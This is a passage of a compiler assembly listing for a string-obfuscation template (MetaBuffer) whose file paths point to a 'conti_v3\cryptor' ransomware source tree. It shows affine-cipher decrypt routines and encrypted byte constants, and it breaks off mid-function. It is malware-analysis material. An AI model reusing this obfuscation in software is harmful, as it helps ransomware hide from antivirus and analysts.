; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 03	 mov	 BYTE PTR [rcx+1], 3
  00007	c6 41 02 2e	 mov	 BYTE PTR [rcx+2], 46	; 0000002eH
  0000b	c6 41 03 57	 mov	 BYTE PTR [rcx+3], 87	; 00000057H
  0000f	c6 41 04 2e	 mov	 BYTE PTR [rcx+4], 46	; 0000002eH
  00013	c6 41 05 40	 mov	 BYTE PTR [rcx+5], 64	; 00000040H
  00017	c6 41 06 2e	 mov	 BYTE PTR [rcx+6], 46	; 0000002eH
  0001b	c6 41 07 71	 mov	 BYTE PTR [rcx+7], 113	; 00000071H
  0001f	c6 41 08 2e	 mov	 BYTE PTR [rcx+8], 46	; 0000002eH
  00023	c6 41 09 06	 mov	 BYTE PTR [rcx+9], 6
  00027	c6 41 0a 2e	 mov	 BYTE PTR [rcx+10], 46	; 0000002eH
  0002b	c6 41 0b 57	 mov	 BYTE PTR [rcx+11], 87	; 00000057H
  0002f	c6 41 0c 2e	 mov	 BYTE PTR [rcx+12], 46	; 0000002eH
  00033	c6 41 0d 78	 mov	 BYTE PTR [rcx+13], 120	; 00000078H
  00037	c6 41 0e 2e	 mov	 BYTE PTR [rcx+14], 46	; 0000002eH
  0003b	c6 41 0f 4e	 mov	 BYTE PTR [rcx+15], 78	; 0000004eH
  0003f	c6 41 10 2e	 mov	 BYTE PTR [rcx+16], 46	; 0000002eH
  00043	c6 41 11 65	 mov	 BYTE PTR [rcx+17], 101	; 00000065H
  00047	c6 41 12 2e	 mov	 BYTE PTR [rcx+18], 46	; 0000002eH
  0004b	c6 41 13 4e	 mov	 BYTE PTR [rcx+19], 78	; 0000004eH
  0004f	c6 41 14 2e	 mov	 BYTE PTR [rcx+20], 46	; 0000002eH
  00053	c6 41 15 2e	 mov	 BYTE PTR [rcx+21], 46	; 0000002eH
  00057	c6 41 16 2e	 mov	 BYTE PTR [rcx+22], 46	; 0000002eH
  0005b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0005f	48 8b c1	 mov	 rax, rcx
  00062	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 17 00 00 00	 mov	 eax, 23
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1f	 mov	 BYTE PTR [rcx+1], 31
  00007	c6 41 02 17	 mov	 BYTE PTR [rcx+2], 23
  0000b	c6 41 03 35	 mov	 BYTE PTR [rcx+3], 53	; 00000035H
  0000f	c6 41 04 17	 mov	 BYTE PTR [rcx+4], 23
  00013	c6 41 05 2b	 mov	 BYTE PTR [rcx+5], 43	; 0000002bH
  00017	c6 41 06 17	 mov	 BYTE PTR [rcx+6], 23
  0001b	c6 41 07 66	 mov	 BYTE PTR [rcx+7], 102	; 00000066H
  0001f	c6 41 08 17	 mov	 BYTE PTR [rcx+8], 23
  00023	c6 41 09 17	 mov	 BYTE PTR [rcx+9], 23
  00027	c6 41 0a 17	 mov	 BYTE PTR [rcx+10], 23
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 46	 sub	 ecx, 70			; 00000046H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3d	 mov	 BYTE PTR [rcx+1], 61	; 0000003dH
  00007	c6 41 02 46	 mov	 BYTE PTR [rcx+2], 70	; 00000046H
  0000b	c6 41 03 6f	 mov	 BYTE PTR [rcx+3], 111	; 0000006fH
  0000f	c6 41 04 46	 mov	 BYTE PTR [rcx+4], 70	; 00000046H
  00013	c6 41 05 1b	 mov	 BYTE PTR [rcx+5], 27
  00017	c6 41 06 46	 mov	 BYTE PTR [rcx+6], 70	; 00000046H
  0001b	c6 41 07 6f	 mov	 BYTE PTR [rcx+7], 111	; 0000006fH
  0001f	c6 41 08 46	 mov	 BYTE PTR [rcx+8], 70	; 00000046H
  00023	c6 41 09 46	 mov	 BYTE PTR [rcx+9], 70	; 00000046H
  00027	c6 41 0a 46	 mov	 BYTE PTR [rcx+10], 70	; 00000046H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 13	 sub	 ecx, 19

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 42	 mov	 BYTE PTR [rcx+1], 66	; 00000042H
  00007	c6 41 02 13	 mov	 BYTE PTR [rcx+2], 19
  0000b	c6 41 03 29	 mov	 BYTE PTR [rcx+3], 41	; 00000029H
  0000f	c6 41 04 13	 mov	 BYTE PTR [rcx+4], 19
  00013	c6 41 05 20	 mov	 BYTE PTR [rcx+5], 32	; 00000020H
  00017	c6 41 06 13	 mov	 BYTE PTR [rcx+6], 19
  0001b	c6 41 07 6d	 mov	 BYTE PTR [rcx+7], 109	; 0000006dH
  0001f	c6 41 08 13	 mov	 BYTE PTR [rcx+8], 19
  00023	c6 41 09 13	 mov	 BYTE PTR [rcx+9], 19
  00027	c6 41 0a 13	 mov	 BYTE PTR [rcx+10], 19
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 50 00 00 00	 mov	 eax, 80			; 00000050H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1a	 mov	 BYTE PTR [rcx+1], 26
  00007	c6 41 02 50	 mov	 BYTE PTR [rcx+2], 80	; 00000050H
  0000b	c6 41 03 3e	 mov	 BYTE PTR [rcx+3], 62	; 0000003eH
  0000f	c6 41 04 50	 mov	 BYTE PTR [rcx+4], 80	; 00000050H
  00013	c6 41 05 19	 mov	 BYTE PTR [rcx+5], 25
  00017	c6 41 06 50	 mov	 BYTE PTR [rcx+6], 80	; 00000050H
  0001b	c6 41 07 19	 mov	 BYTE PTR [rcx+7], 25
  0001f	c6 41 08 50	 mov	 BYTE PTR [rcx+8], 80	; 00000050H
  00023	c6 41 09 50	 mov	 BYTE PTR [rcx+9], 80	; 00000050H
  00027	c6 41 0a 50	 mov	 BYTE PTR [rcx+10], 80	; 00000050H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
